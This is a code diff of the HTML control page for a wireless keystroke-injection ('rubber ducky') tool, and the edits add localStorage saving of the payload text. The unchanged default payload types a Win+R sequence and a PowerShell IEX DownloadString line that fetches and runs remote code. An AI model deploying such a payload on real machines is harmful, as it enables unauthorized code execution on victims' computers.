@@ -9,7 +9,7 @@
 </head>
 
 <body>
-	<h1>wireless ducky!!</h1>
+	<h1>wireless rubber ducky!!</h1>
 	<div>
 		<h3>send keystrokes:</h3>
 		<textarea style="width: 800px; height: 300px;" type="text" id="keys-to-send"></textarea>
@@ -47,6 +47,7 @@ function terminate() {
 }
 
 function submit() {
+	
 	let input = document.getElementById("keys-to-send").value
 	let to_send = []
 	let maxLength = 1300
@@ -67,8 +68,14 @@ function submit() {
 	})
 }
 document.addEventListener("DOMContentLoaded", () => {
-	// Default text
-	document.getElementById("keys-to-send").innerHTML = `> GUI DOWN
+	
+	let savedPayload = localStorage.getItem('payload')
+	if (savedPayload !== null) {
+		// use localstorage saved payload
+		document.getElementById("keys-to-send").innerHTML = savedPayload
+	} else {
+		// Default text
+		document.getElementById("keys-to-send").innerHTML = `> GUI DOWN
 > R DOWN
 > R UP
 > GUI UP
@@ -91,7 +98,15 @@ IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubuserconte
 > ENTER DOWN
 > ENTER UP
 `
+	}
+
 })
+
+document.getElementById("keys-to-send").addEventListener("input", ()=>{
+	// save your payload to local storage to presist after reload
+	localStorage.setItem('payload', document.getElementById("keys-to-send").value);
+})
+
 </script>
 
 </html>
